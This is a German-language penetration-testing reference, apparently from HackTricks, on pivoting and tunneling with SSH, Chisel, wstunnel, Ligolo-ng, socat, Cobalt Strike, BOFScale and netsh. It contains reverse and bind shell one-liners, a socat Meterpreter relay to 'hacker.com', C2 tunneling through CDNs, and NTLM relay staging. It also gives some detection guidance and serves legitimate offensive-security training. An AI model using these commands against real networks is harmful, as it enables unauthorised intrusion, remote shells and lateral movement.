# Tunneling und Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap-Tipp

> [!WARNING]
> Die Proxy-Unterstützung von Nmap ist auf TCP-Verbindungen beschränkt und wirkt sich nicht auf Ping-, Port- oder Betriebssystemerkennungsscans aus. Wenn sich der Scanner hinter einem SOCKS-Proxy befindet, **deaktiviere die Host-Erkennung** (`-Pn`) und verwende einen **TCP-Connect-Scan** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Der letzte Befehl verwendet die Optionen `-u` und `-i` von Evil-WinRM, um das Konto und den WinRM-Host anzugeben; der Standardport für WinRM ist 5985.<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSH kann X11-Verbindungen, beliebige TCP-Ports und Unix-Domain-Sockets über seinen verschlüsselten Kanal weiterleiten.<sup>[[6]](#references)</sup>

Grafische SSH-Verbindung (X)

`-Y` aktiviert vertrauenswürdige X11-Weiterleitung und `-C` fordert die Komprimierung weitergeleiteter Daten an.<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

Neuen Port im SSH-Server öffnen --> Anderer Port

Remote-Forwarding (`-R`) lauscht auf dem SSH-Server und verbindet sich mit der lokalen Seite; die explizite Bind-Adresse legt fest, über welche Schnittstellen dieser Listener erreichbar ist.<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Lokaler Port --> Kompromittierter Host (SSH) --> Third_box:Port

Local (`-L`)-Weiterleitung lauscht auf dem Client und verbindet sich von der SSH-Serverseite aus mit dem Ziel.<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Lokaler Port --> kompromittierter Host (SSH) --> beliebiges Ziel

Dynamisches Forwarding (`-D`) erstellt einen lokalen SOCKS4/SOCKS5-Listener, dessen Verbindungen von der Remote-Seite aus geöffnet werden.<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### Multi-hop mit ProxyJump

`-J`/`ProxyJump` verbindet sich über einen oder mehrere durch Kommas getrennte Jump Hosts mit dem Ziel. Die Forwarding-Optionen gehören weiterhin zur finalen SSH-Verbindung, sodass der SOCKS-Listener unten Ziele von `internal-target` aus öffnet und nicht vom ersten Bastion-Host. So muss man sich nicht bei einem Jump Host anmelden und dort einen zweiten SSH-Client starten.<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

Host-spezifische Optionen für Jump-Hosts sollten in `~/.ssh/config` eingetragen werden; Konfigurationen auf der Kommandozeile, die für das Ziel bestimmt sind, werden nicht automatisch auf Zwischenhosts angewendet.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Dies ist nützlich, um Reverse Shells von internen Hosts über eine DMZ zu deinem Host zu erhalten:

Die Einstellung `GatewayPorts` des Servers steuert, ob ein Remote-Forward über die Loopback-Schnittstelle hinaus binden darf; der Standardwert ist `no`.<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

Dieses root-basierte Beispiel erstellt auf beiden Hosts Tunnelgeräte. Der Server muss tun-Forwarding erlauben, und das ausgewählte Konto muss Zugriff auf das tun-Gerät haben; `PermitRootLogin yes` ist eine Möglichkeit, hier das Konto `root` zu verwenden.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Weiterleitung auf der Serverseite aktivieren

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Eine neue Route auf der Client-Seite festlegen

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Sicherheit – Terrapin Attack (CVE-2023-48795)**  
> OpenSSH 9.6 hat eine strict-KEX-Erweiterung eingeführt, um Terrapins Integritätsangriff während der frühen Transportphase abzuwehren. Aktualisieren Sie, wo möglich, beide Peers und befolgen Sie bei älteren Implementierungen die Herstellerhinweise, statt davon auszugehen, dass ein weitergeleiteter Channel allein aufgrund der Version geschützt ist.<sup>[[8]](#references)</sup>

## SSHUTTLE

Sie können den gesamten **Traffic** über **ssh** durch einen Host in ein **Subnetz** **tunneln**.\
Zum Beispiel den gesamten Traffic weiterleiten, der an 10.10.10.0/24 geht.

`sshuttle` ermöglicht transparentes Proxying über SSH und unterstützt die Auswahl von Subnetzen sowie einen benutzerdefinierten SSH-Befehl, wie unten gezeigt.<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Mit einem privaten Schlüssel verbinden

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

Metasploit's `portfwd` unterstützt lokales und entferntes Forwarding, während sein SOCKS-Proxy-Modul für die Verwendung mit Session-Routen oder `autoroute` vorgesehen ist und in diesen Beispielen standardmäßig auf Port 1080 lauscht.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Lokaler Port --> Kompromittierter Host (aktive Session) --> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Eine weitere Möglichkeit:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Der Beacon von Cobalt Strike kann SOCKS4a-/SOCKS5-Verbindungen über einen Beacon weiterleiten; `rportfwd` bindet auf dem kompromittierten Host, während `rportfwd_local` die Verbindung zum Ziel vom Cobalt-Strike-Client aus initiiert.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Öffne einen Port auf dem Team Server auf den Schnittstellen, über die der Traffic durch den Beacon geleitet werden soll.<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> In diesem Fall wird der Port auf dem Beacon-Host geöffnet, nicht auf dem Team Server, und der Datenverkehr wird an den Team Server und von dort an den angegebenen Host:Port gesendet.<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

Das Handbuch zum Reverse-Forwarding weist auf folgendes Verhalten hin:<sup>[[14]](#references)</sup>

- Beacons Reverse-Port-Forward ist dafür ausgelegt, **Datenverkehr zum Team Server zu tunneln, nicht zur Weiterleitung zwischen einzelnen Rechnern**.
- Der Datenverkehr wird **innerhalb von Beacons C2-Datenverkehr getunnelt**, einschließlich P2P-Links.
- Hohe Ports umgehen in der Regel Einschränkungen für privilegierte Ports. Die Richtlinien des Zielbetriebssystems und bereits vorhandene Listener gelten jedoch weiterhin.

### rPort2Port local

> [!WARNING]
> In diesem Fall wird der **Port auf dem Beacon-Host geöffnet**, nicht auf dem Team Server, und der **Datenverkehr wird an den Cobalt Strike-Client gesendet** (nicht an den Team Server) und von dort an den angegebenen Host:Port.<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## BOFScale – CDN-vorgelagertes In-Process-Tailnet

[BOFScale](https://github.com/NetSPI/BOFscale) führt ein modifiziertes Tailscale-Overlay innerhalb eines Windows-C2-Implants aus, ohne einen TUN-Treiber oder Dienst zu installieren. Es besteht aus drei Komponenten: einem asynchronen CGo-`c-shared`-`tailscaled`-BOF-PE, einem kleinen C++-BOF-PE, das mit der lokalen API kommuniziert, und einer asynchronen `socksportfwd`-TCP-zu-SOCKS5-Bridge.<sup>[[53]](#references)[[54]](#references)</sup>

### CDN-kompatibles TS2021 und DERP

Tailscale verwendet normalerweise proprietäre HTTP-Upgrades für den auf Noise basierenden TS2021-Control-Channel und das DERP-Relay. BOFScale behält diese Byte-Streams bei, überträgt sie aber in RFC-6455-WebSockets mit `Sec-WebSocket-Protocol: ts2021` oder `derp`. So kann ein vom Operator kontrollierter Headscale-/DERP-Ursprung hinter einem CDN liegen, das nur standardmäßige WebSocket-Upgrades akzeptiert. Der gepatchte Client versucht TS2021 nach einem HTTP-`500` erneut über WebSockets und DERP nach einem HTTP-`426`; außerdem berücksichtigt der DERP-WebSocket-Dialer die Host-Proxy-Konfiguration. Der BOF setzt `TS_DEBUG_DERP_WS_CLIENT=1`, um den bekanntermaßen fehlschlagenden ersten Versuch zu überspringen.<sup>[[53]](#references)[[54]](#references)</sup>

Das CDN und der Origin-Proxy müssen WebSocket-Upgrades für `/ts2021` und `/derp` beibehalten, `/key` als gewöhnliches HTTP weiterleiten und interne Lese-/Schreib-Timeouts deaktivieren, da Relay-Sitzungen unbegrenzt offen bleiben können. Die bereitgestellte Headscale-Konfiguration aktiviert `verify_clients`, veröffentlicht nur die eingebettete DERP-Map des Operators und lässt `derp.urls` leer, um ein Fallback auf von Tailscale betriebene Relays zu verhindern.<sup>[[53]](#references)[[54]](#references)</sup>

### In-Process-Daemon und Named-Pipe-Steuerung

Sofern nicht anders angegeben, startet der BOF-Einstiegspunkt `tailscaled` mit `-tun=userspace-networking`, `-state mem:` und `-no-logs-no-support` und erstellt anschließend eine Pipe mit UUID-Namen. Die Go-Standardausgabe und -Fehlerausgabe werden über eine OS-Pipe zur Beacon-Ausgabe-API umgeleitet. Dadurch bleiben der vollständige Daemon und die Go-Runtime im Arbeitsspeicher, während Status und Logs nicht in ein Tailscale-Verzeichnis geschrieben werden.<sup>[[53]](#references)[[54]](#references)</sup>

Der schlanke Client bildet Tailscales lokale HTTP/1.0-API über diese Pipe nach. Er öffnet die Pipe mit `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION`, da die `safesocket`-Schicht des Daemons den Pipe-Client impersoniert, sendet `Tailscale-Cap: 125` und bildet die lokale API auf die Vorgänge `up`, `down`, `status`, Routenankündigung und Shutdown ab.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Entladen Sie ein manuell gemapptes Go-BOF-PE nicht, nachdem Sie den Daemon zum Herunterfahren aufgefordert haben: Goroutinen der Runtime und des Garbage Collectors können weiterhin Code ausführen, der sich in einem vom Loader entmappten Speicherbereich befindet. Führen Sie `tailscaled` in einem Wegwerfprozess aus und beenden Sie diesen Prozess zur endgültigen Bereinigung.<sup>[[54]](#references)</sup>

### Vom Host ausgehenden Datenverkehr über SOCKS5 im Userspace weiterleiten

Eingehende Tailnet-Verbindungen und angekündigte Subnetzrouten funktionieren innerhalb des Userspace-Netzwerk-Stacks. Normale Prozesse auf dem kompromittierten Host haben jedoch keine OS-Route in das Overlay. `socksportfwd` lauscht daher an einem für Opfer erreichbaren TCP-Port, handelt mit dem `0.0.0.0:1080`-Listener des Daemons SOCKS5 `NO AUTH` aus, sendet für ein Tailnet-Ziel `CONNECT` und leitet den Datenverkehr asynchron in beide Richtungen weiter. Ist das Ziel ein MagicDNS-Name, wird `ATYP_DOMAIN` verwendet. Dadurch löst `tailscaled` den Namen auf, ohne ihn dem Windows-Resolver offenzulegen.<sup>[[53]](#references)[[54]](#references)</sup>

Ein minimaler Ablauf für den Operator ist unten dargestellt. Sowohl der Operator-Knoten als auch das Implant müssen die gepatchten Binärdateien verwenden, da Standard-Tailscale dieses CDN-Design nicht durchqueren kann.<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

Der Local Forward kann den scheinbaren Authentication-Listener vom Relay-Tool trennen: Zwinge einen Rechner dazu, sich am gebundenen Port des kompromittierten Hosts zu authentifizieren, leite den Traffic über das Tailnet an `ntlmrelayx` weiter und relaye ihn anschließend an AD CS, LDAP, HTTP, SMB oder ein anderes kompatibles Ziel. Siehe [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) und [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) für die jeweiligen Phasen der Schwachstellenausnutzung; BOFScale dient nur als Transport.<sup>[[54]](#references)</sup>

### Erkennung

Suche nach dieser Kombination statt nach einem einzelnen schwachen Indikator: einer Go-Runtime in einem Prozess, der normalerweise nicht auf Go basiert, einer UUID-Pipe mit permissivem SDDL `D:(A;;GA;;;WD)`, einem unerwarteten SOCKS-Listener auf `0.0.0.0:1080` und langlebigen TLS-WebSockets zu CDN-Adressen. Bei TLS-Inspektion kennzeichne `Sec-WebSocket-Protocol: derp` oder `ts2021`, wenn der zugehörige Prozess kein autorisierter `tailscaled`-Dienst ist. Die `bofscale.yar`-Regeln des Repositorys enthalten Memory-Signaturen für alle drei BOF-PE-Komponenten.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Das Projekt stellt Web-Tunnel-Endpunkte wie `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` und `tunnel.php` bereit. Lade einen unterstützten Endpunkt hoch, bevor du den lokalen Proxy startest.<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

Du kannst es von der Releases-Seite unter [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) herunterladen.\
Chisel überträgt TCP/UDP-Verkehr über HTTP und verwendet dabei eine durch SSH geschützte Verbindung. Verwende kompatible Client-/Server-Builds und überprüfe die Befehlssyntax der ausgewählten Release-Version.<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Port forwarding

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) transportiert statische oder dynamische Forwards über WebSocket, HTTP/2 oder WebTransport (HTTP/3 über QUIC). Aktuelle Builds unterstützen TCP, UDP, Unix-Sockets, stdio, SOCKS5, HTTP-Proxying und Linux-Listener für transparente Proxys im Forward- und Reverse-Modus.<sup>[[52]](#references)</sup>

### Reverse-SOCKS5-Pivot

Führe den Server auf dem Angreifer aus und lasse den Pivot mit `-R` eine ausgehende Verbindung herstellen. Bei dieser Richtung wird der SOCKS5-Listener auf dem **Server** erstellt, während angeforderte Verbindungen aus dem Netzwerk des **Clients/Pivots** stammen.<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

Ein Reverse Static Forward verwendet dieselbe Richtung. Zum Beispiel macht Folgendes `10.10.10.20:445`, wie über den Pivot erreichbar, auf dem Loopback-Port des Angreifers `8445` verfügbar:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Egress- und Transportdetails

- Füge `-p http://user:pass@proxy:8080` zum Client hinzu, um einen expliziten HTTP-Proxy zu durchqueren. Verwende in Clients wie `curl` `socks5h://127.0.0.1:1080` (oder aktiviere proxied DNS in der Anwendung), damit interne Namen jenseits des Tunnels aufgelöst und nicht an den lokalen Resolver weitergegeben werden.<sup>[[52]](#references)</sup>
- `wss://` wählt TLS-geschütztes WebSocket aus. Ein `https://`-Client wählt HTTP/2 aus, aber Buffering oder die Umwandlung in HTTP/1 durch Reverse-Proxies/CDNs unterbricht häufig den bidirektionalen Datenstrom; stelle den wstunnel-Server beim Testen dieses Modus direkt bereit.<sup>[[52]](#references)</sup>
- `wts://` wählt WebTransport über QUIC aus. Starte den Server mit `--enable-webtransport` (oder einer `wts://`-Listen-URL) und erlaube UDP auf dem Listening-Port. Dieser Modus kann keinen herkömmlichen HTTP-`CONNECT`-Proxy durchqueren, da dieser Proxy TCP überträgt.<sup>[[52]](#references)</sup>

> [!WARNING]
> Das Upstream-Projekt warnt davor, das eingebettete selbstsignierte Zertifikat als Datenschutzmaßnahme zu betrachten. Verwende vorzugsweise ein gültiges benutzerdefiniertes Zertifikat plus `--tls-verify-certificate` (oder mTLS), binde Proxy-Listener nur an Loopback, sofern kein Fernzugriff beabsichtigt ist, und tunnel bereits sichere Protokolle, wenn Vertraulichkeit wichtig ist.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Der Ligolo-ng-Schnellstart beschreibt eine TUN-Schnittstelle auf dem Proxy, die Validierung des Zertifikat-Fingerprints für den Agenten und die Einrichtung einer Route für das getunnelte Netzwerk.<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Binden und Lauschen auf dem Agent

Ligolo-ng kann Listener auf dem Agent hinzufügen, die an eine proxyseitige Adresse weiterleiten. Außerdem kann sein reservierter Bereich `240.0.0.0/4` geroutet werden, um agent-lokale Dienste zu erreichen.<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Zugriff auf die lokalen Ports des Access Agent

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot startet den Reverse-Tunnel auf dem Opfer und stellt einen SOCKS4-Proxy auf der Loopback-Adresse des Angreifers bereit; das README dokumentiert außerdem NTLM-Proxy-Anmeldedaten und Hash-Optionen.<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot über **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat kombiniert Adresstypen wie `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` und `PROXY`; die folgenden Beispiele kombinieren diese dokumentierten Endpunkte.<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### Port2Port über SOCKS

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter über SSL Socat

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

Du kannst einen **nicht authentifizierten Proxy** mit dem dokumentierten Adresstyp `PROXY` von socat durchqueren, indem du diese Zeile statt der letzten in der Konsole des Opfers ausführst.<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL-Socat-Tunnel

**/bin/sh-Konsole**

Erstelle Zertifikate auf beiden Seiten: Client und Server

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

Verbinde den lokalen SSH-Port (22) mit Port 443 auf dem Angreifer-Host.

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Plink ist PuTTYs Verbindungstool für die Kommandozeile und bietet SSH-Weiterleitungsoptionen ähnlich wie `ssh`.<sup>[[22]](#references)</sup>

Verwende für den SSH-Port das großgeschriebene `-P`. `-pw` wird aus Kompatibilitätsgründen weiterhin unterstützt, macht das Passwort jedoch in der Prozessliste sichtbar. Verwende nach Möglichkeit die Authentifizierung per Schlüssel oder `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>

Da diese Binärdatei auf dem Opfer ausgeführt wird und ein SSH-Client ist, öffne den SSH-Dienst und -Port für die Rückverbindung. Im Folgenden leitet `-R` einen lokal zugänglichen Port an den Computer des Angreifers weiter.<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Verwenden Sie beim Erstellen oder Ändern persistenter `portproxy`-Regeln einen Kontext mit den erforderlichen Berechtigungen auf dem Host. Microsoft dokumentiert die unten verwendeten `v4tov4`-Formen zum Hinzufügen, Anzeigen und Löschen.<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### `portproxy` über eine geplante Aufgabe bereitstellen

Wenn administrative Anmeldedaten verfügbar sind, kann die Remoteausführung über den Task Scheduler eine native Weiterleitungsregel installieren, ohne einen dedizierten Relay hochzuladen. Beispielsweise kann [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) einen Pivot auf TCP/443 lauschen lassen und die Verbindung an einen internen SMB-Dienst weiterleiten.<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

Die Regel bleibt bestehen. Führe daher `netsh interface portproxy show v4tov4` aus, um sie aufzulisten, und entferne sie nach dem Test ausdrücklich. Denk daran, dass `portproxy` nur die Weiterleitung bereitstellt; die Host-Firewall muss den lauschenden Port ebenfalls zulassen.<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

Du benötigst **RDP-Zugriff auf das System**.\
Herunterladen:

SocksOverRDP verwendet Remote Desktop Dynamic Virtual Channels, um eine SOCKS5-Verbindung über eine bestehende RDP-Sitzung zu übertragen. Das Client-Plugin lauscht auf `127.0.0.1:1080`, während die Serverkomponente auf dem RDP-Ziel ausgeführt wird.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) – Dieses Tool verwendet `Dynamic Virtual Channels` (`DVC`) der Windows-Funktion Remote Desktop Service. DVC ist für das **Tunneln von Paketen über die RDP-Verbindung** zuständig.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Lade auf deinem Clientcomputer **`SocksOverRDP-Plugin.dll`** wie folgt:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Jetzt können wir uns über **RDP** mit dem **Opfer** verbinden, indem wir **`mstsc.exe`** verwenden. Es sollte eine **Aufforderung** erscheinen, die besagt, dass das **SocksOverRDP plugin** aktiviert ist und auf **127.0.0.1:1080** **lauscht**.

Über **RDP** **verbinden** und die Binärdatei `SocksOverRDP-Server.exe` auf den Rechner des Opfers hochladen und ausführen:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Überprüfe nun auf deinem Rechner (Angreifer), ob Port 1080 lauscht:

```
netstat -antb | findstr 1080
```

Jetzt kannst du [**Proxifier**](https://www.proxifier.com/) verwenden, um den Traffic über diesen Port zu proxifizieren.<sup>[[26]](#references)</sup>

### RDP-Virtual-Channel-Hunting

